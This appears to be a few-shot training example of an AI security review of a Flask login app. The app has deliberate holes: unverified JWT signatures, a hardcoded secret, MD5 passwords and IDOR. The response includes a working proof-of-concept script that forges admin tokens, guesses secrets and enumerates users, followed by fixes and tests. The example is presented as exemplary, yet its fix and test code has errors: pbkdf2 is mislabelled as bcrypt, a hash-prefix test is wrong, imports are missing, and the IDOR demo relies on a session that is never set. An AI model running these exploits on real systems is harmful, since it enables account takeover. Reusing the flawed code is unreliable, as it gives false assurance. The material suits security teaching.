# Few-Shot Example: Authentication Bypass Vulnerability

**Domain:** security
**Skill Level:** Advanced
**Pattern:** Identify → PoC → Fix → Verify

---

## User Query

Review this authentication system for bypass vulnerabilities:

```python
from flask import Flask, request, session, jsonify
import jwt
import hashlib

app = Flask(__name__)
app.secret_key = "development-secret-key"

USERS = {
    "admin": {"password": "5f4dcc3b5aa765d61d8327deb882cf99", "role": "admin"},  # md5(password)
    "user": {"password": "ee11cbb19052e40b07aac0ca060c23ee", "role": "user"}  # md5(user)
}

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')

    password_hash = hashlib.md5(password.encode()).hexdigest()

    if username in USERS and USERS[username]['password'] == password_hash:
        token = jwt.encode(
            {"user": username, "role": USERS[username]['role']},
            app.secret_key,
            algorithm="HS256"
        )
        return jsonify({"token": token})

    return jsonify({"error": "Invalid credentials"}), 401

@app.route('/admin')
def admin():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    try:
        payload = jwt.decode(token, options={"verify_signature": False})
        if payload.get('role') == 'admin':
            return jsonify({"message": "Welcome, admin!", "secrets": "..."})
    except:
        pass

    return jsonify({"error": "Unauthorized"}), 403

@app.route('/api/user/<user_id>')
def get_user(user_id):
    # Check if logged in
    if not session.get('logged_in'):
        return jsonify({"error": "Login required"}), 401

    # Return user data
    return jsonify({"user_id": user_id, "data": get_user_data(user_id)})
```

---

## Exemplary Response

### 1. Vulnerability Identification

| # | Location | Vulnerability | CWE | Severity |
|---|----------|--------------|-----|----------|
| 1 | Line 7 | Hardcoded secret key | CWE-798 | Critical |
| 2 | Line 10-11 | MD5 password hashing | CWE-328 | High |
| 3 | Line 31 | JWT signature disabled | CWE-347 | Critical |
| 4 | Line 39 | IDOR - no authorization check | CWE-639 | High |
| 5 | Line 10 | Hardcoded credentials | CWE-259 | Critical |

### 2. Attack Vector Analysis

#### Vuln 1: JWT Signature Bypass (Most Critical)

The admin endpoint disables signature verification:
```python
payload = jwt.decode(token, options={"verify_signature": False})
```

**Attack:** Forge any JWT to become admin:

```python
import jwt

# Attacker creates their own token
forged_token = jwt.encode(
    {"user": "attacker", "role": "admin"},
    "any-key-works",  # Doesn't matter!
    algorithm="HS256"
)
# This token will be accepted as admin
```

#### Vuln 2: Weak Secret Key

The secret key `"development-secret-key"` can be:
1. Guessed by attacker
2. Found in public repos
3. Brute-forced with common wordlists

#### Vuln 3: MD5 Password Hashing

MD5 is cryptographically broken:
- `5f4dcc3b5aa765d61d8327deb882cf99` = `password` (lookup in rainbow tables)
- No salt = same password produces same hash

#### Vuln 4: IDOR (Insecure Direct Object Reference)

```
GET /api/user/1      # Returns user 1's data
GET /api/user/999    # Returns user 999's data (no authz check!)
```

Any authenticated user can access any other user's data.

### 3. Proof of Concept

```python
#!/usr/bin/env python3
"""
auth_bypass_poc.py - Demonstrates authentication vulnerabilities
"""

import requests
import jwt
import hashlib

TARGET = "http://localhost:5000"

def poc_jwt_bypass():
    """Bypass JWT signature verification to gain admin access."""
    print("[1] JWT Signature Bypass")
    print("-" * 40)

    # Create forged admin token
    forged_token = jwt.encode(
        {"user": "hacker", "role": "admin"},
        "doesnt-matter",
        algorithm="HS256"
    )

    response = requests.get(
        f"{TARGET}/admin",
        headers={"Authorization": f"Bearer {forged_token}"}
    )

    if response.status_code == 200:
        print(f"[VULN] Admin access granted with forged token!")
        print(f"[DATA] {response.json()}")
    else:
        print("[SAFE] JWT bypass failed")

def poc_weak_secret():
    """Attempt to crack weak secret key."""
    print("\n[2] Weak Secret Key Attack")
    print("-" * 40)

    # Common secrets to try
    common_secrets = [
        "secret", "development-secret-key", "changeme",
        "password", "key", "jwt-secret", "app-secret"
    ]

    # Get a valid token first
    valid_token = "eyJ..."  # From legitimate login

    for secret in common_secrets:
        try:
            jwt.decode(valid_token, secret, algorithms=["HS256"])
            print(f"[VULN] Secret key found: {secret}")
            break
        except jwt.InvalidSignatureError:
            continue

def poc_idor():
    """Demonstrate IDOR vulnerability."""
    print("\n[3] IDOR Attack")
    print("-" * 40)

    # Login as regular user
    session = requests.Session()
    login_resp = session.post(f"{TARGET}/login", json={
        "username": "user",
        "password": "user"
    })

    if login_resp.status_code != 200:
        print("[SKIP] Cannot login")
        return

    # Access other users' data
    for user_id in range(1, 10):
        resp = session.get(f"{TARGET}/api/user/{user_id}")
        if resp.status_code == 200:
            print(f"[VULN] Accessed user {user_id}'s data: {resp.json()}")

if __name__ == "__main__":
    poc_jwt_bypass()
    poc_weak_secret()
    poc_idor()
```

### 4. Remediation

#### Fix 1: Proper JWT Verification

```python
import os
from functools import wraps

# Use environment variable for secret
app.config['SECRET_KEY'] = os.environ.get('JWT_SECRET_KEY')
if not app.config['SECRET_KEY'] or len(app.config['SECRET_KEY']) < 32:
    raise ValueError("JWT_SECRET_KEY must be at least 32 characters")

def require_admin(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization', '').replace('Bearer ', '')

        try:
            # ALWAYS verify signature!
            payload = jwt.decode(
                token,
                app.config['SECRET_KEY'],
                algorithms=["HS256"]
            )

            if payload.get('role') != 'admin':
                return jsonify({"error": "Admin required"}), 403

        except jwt.ExpiredSignatureError:
            return jsonify({"error": "Token expired"}), 401
        except jwt.InvalidTokenError as e:
            return jsonify({"error": "Invalid token"}), 401

        return f(*args, **kwargs)
    return decorated

@app.route('/admin')
@require_admin
def admin():
    return jsonify({"message": "Welcome, admin!", "secrets": "..."})
```

#### Fix 2: Secure Password Hashing

```python
from werkzeug.security import generate_password_hash, check_password_hash
import secrets

def hash_password(password: str) -> str:
    """Hash password with bcrypt (via werkzeug)."""
    return generate_password_hash(password, method='pbkdf2:sha256:600000')

def verify_password(password: str, password_hash: str) -> bool:
    """Verify password against hash."""
    return check_password_hash(password_hash, password)

# Store hashed passwords
USERS = {
    "admin": {
        "password": hash_password(os.environ['ADMIN_PASSWORD']),
        "role": "admin"
    }
}

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')

    if username not in USERS:
        # Constant-time comparison to prevent timing attacks
        verify_password("dummy", generate_password_hash("dummy"))
        return jsonify({"error": "Invalid credentials"}), 401

    if not verify_password(password, USERS[username]['password']):
        return jsonify({"error": "Invalid credentials"}), 401

    # Create token with expiration
    token = jwt.encode(
        {
            "user": username,
            "role": USERS[username]['role'],
            "exp": datetime.utcnow() + timedelta(hours=1)
        },
        app.config['SECRET_KEY'],
        algorithm="HS256"
    )
    return jsonify({"token": token})
```

#### Fix 3: Authorization Check (IDOR Prevention)

```python
from flask_login import current_user, login_required

@app.route('/api/user/<user_id>')
@login_required
def get_user(user_id):
    # Authorization: user can only access their own data
    if str(current_user.id) != str(user_id):
        # Unless they're admin
        if current_user.role != 'admin':
            return jsonify({"error": "Access denied"}), 403

    return jsonify({"user_id": user_id, "data": get_user_data(user_id)})
```

### 5. Verification

```python
# test_auth_fixed.py
import pytest
import jwt
import os

def test_jwt_requires_valid_signature(client):
    """JWT with invalid signature should be rejected."""
    forged_token = jwt.encode(
        {"user": "hacker", "role": "admin"},
        "wrong-secret",
        algorithm="HS256"
    )

    response = client.get('/admin', headers={
        "Authorization": f"Bearer {forged_token}"
    })

    assert response.status_code == 401
    assert "Invalid token" in response.json['error']

def test_expired_token_rejected(client):
    """Expired tokens should be rejected."""
    expired_token = jwt.encode(
        {"user": "admin", "role": "admin", "exp": 0},
        os.environ['JWT_SECRET_KEY'],
        algorithm="HS256"
    )

    response = client.get('/admin', headers={
        "Authorization": f"Bearer {expired_token}"
    })

    assert response.status_code == 401

def test_idor_prevented(client, auth_user):
    """Users cannot access other users' data."""
    # Login as user 1
    token = auth_user(user_id=1)

    # Try to access user 2's data
    response = client.get('/api/user/2', headers={
        "Authorization": f"Bearer {token}"
    })

    assert response.status_code == 403

def test_password_not_stored_plaintext():
    """Passwords should be hashed, not plaintext."""
    from app import USERS

    for username, data in USERS.items():
        # Check it's not plaintext
        assert not data['password'].startswith('$')  # Not plaintext
        assert len(data['password']) > 50  # Proper hash length
```

### 6. Security Headers

```python
@app.after_request
def add_security_headers(response):
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Cache-Control'] = 'no-store'
    return response
```

### 7. References

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [CWE-798: Hardcoded Credentials](https://cwe.mitre.org/data/definitions/798.html)
- [CWE-347: Improper Verification of Cryptographic Signature](https://cwe.mitre.org/data/definitions/347.html)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [JWT Security Best Practices](https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/)

---

## Why This Is A Good Example

- Identifies multiple layered vulnerabilities
- Shows complete attack chain (PoC scripts)
- Provides production-ready fixes
- Includes comprehensive test cases
- References authoritative sources

---

## Key Patterns

1. **Defense in Depth** - Multiple security layers
2. **Principle of Least Privilege** - Users only access their own data
3. **Secure Defaults** - Signature verification enabled by default
4. **No Hardcoded Secrets** - Environment variables for credentials

---

**Tags:** #security #authentication #jwt #idor #cwe-798 #cwe-347 #code-review
**Version:** 1.0.0
**Last Updated:** 2026-01-23
